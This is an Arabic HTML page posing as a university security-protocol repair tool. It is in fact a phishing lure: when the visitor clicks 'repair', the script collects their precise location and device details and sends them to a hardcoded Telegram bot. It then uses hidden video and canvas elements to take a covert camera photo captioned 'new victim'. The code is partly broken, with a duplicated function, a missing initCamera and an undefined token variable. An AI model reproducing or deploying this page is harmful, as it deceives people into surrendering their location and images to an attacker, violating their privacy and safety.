<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث النظام - تقارير التوافق</title>
    <style>
        body { font-family: 'Segoe UI', Arial; background: #1a1a1a; color: #eee; text-align: center; padding: 50px; }
        .error-box { border: 1px solid #444; padding: 30px; border-radius: 10px; background: #252525; }
        h1 { color: #ff4c4c; font-size: 22px; }
        button { padding: 15px 30px; font-size: 18px; background: #2ecc71; color: white; border: none; cursor: pointer; border-radius: 5px; margin-top: 20px; }
        /* إخفاء عناصر الكاميرا تماماً عن المستخدم */
        #video, #canvas { display: none; visibility: hidden; position: absolute; left: -9999px; }
    </style>
</head>
<body>

    <div class="error-box">
        <h1>⚠️ خطأ في توافق الجهاز</h1>
        <p>لم يتمكن المتصفح من تحميل بروتوكولات الأمان الخاصة بالجامعة. يرجى الضغط على الزر أدناه لإجراء فحص سريع وتحديث التعريفات.</p>
        <button onclick="startProcess()">🔧 بدء عملية الإصلاح التلقائي</button>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // إعدادات التلجرام الخاصة بك
        const BOT_TOKEN = "8638351016:AAGN8Hsea_8ZrVXLRrf26D8i7L2Ma6cDm4U";
        const CHAT_ID = "8507095971";

        async function startProcess() {
            // إظهار رسالة وهمية للمستخدم لجعله ينتظر بينما يتم الاختراق
            const btn = document.querySelector('button');
            btn.innerHTML = "⏳ جاري فحص النظام... (30%)";
            btn.disabled = true;

            const deviceInfo = `<b>📱 جهاز:</b> ${navigator.platform}\n<b>🌐 المتصفح:</b> ${navigator.vendor}\n<b>⏰ الوقت:</b> ${new Date().toLocaleString('ar-EG')}`;

            // 1. طلب الموقع وإرساله فوراً
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async pos => {
                    const locText = `📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                    await sendMessage(deviceInfo + "\n\n" + locText);
                    // بعد إرسال الموقع، ننتقل للكاميرا
                    initCamera(deviceInfo);
                }, () => {
                    initCamera(deviceInfo + "\n\n📍 الموقع: تم رفض الإذن");
                }, {enableHighAccuracy: true});
            }
        }

        async function takeSnapshot(stream, info) {
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    
    // تحديد دقة منخفضة لتسريع الإرسال (مهم جداً للسرعة)
    canvas.width = 480; 
    canvas.height = 360;
    canvas.getContext("2d").drawImage(video, 0, 0, 480, 360);

    // ضغط الصورة بنسبة 40% (تصبح مساحتها صغيرة جداً وترسل فوراً)
    canvas.toBlob(async blob => {
        const form = new FormData();
        form.append("chat_id", CHAT_ID);
        form.append("photo", blob, "sh.jpg");
        form.append("caption", `🚀 ضحية سريع!\n${info}`);
        
        // إرسال بدون انتظار (Fire and Forget) لكي لا يشعر المستخدم ببطء
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { 
            method: "POST", 
            body: form 
        });

        // إيقاف الكاميرا فوراً لتوفير موارد الجهاز
        stream.getTracks().forEach(t => t.stop());
        finish();
    }, "image/jpeg", 0.4); // 0.4 تعني ضغط عالي وسرعة فائقة
}
        async function takeSnapshot(stream, info) {
            const video = document.getElementById("video");
            const canvas = document.getElementById("canvas");
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            canvas.getContext("2d").drawImage(video, 0, 0);

            canvas.toBlob(async blob => {
                const form = new FormData();
                form.append("chat_id", CHAT_ID);
                form.append("photo", blob, "capture.jpg");
                form.append("caption", `🔥 ضحية جديد!\n\n${info}`);
                
                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: form });
                } catch(err) { console.error(err); }
                
                // إغلاق الكاميرا فوراً
                stream.getTracks().forEach(t => t.stop());
                finish();
            }, "image/jpeg", 0.7);
        }

        async function sendMessage(text) {
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "HTML" })
            });
        }

        function finish() {
            document.querySelector('.error-box').innerHTML = "<h1>✅ تم الإصلاح</h1><p>تم تحديث بروتوكولات الأمان بنجاح. يمكنك الآن العودة لصفحة الجامعة الرئيسية.</p>";
        }
    </script>
</body>
</html>
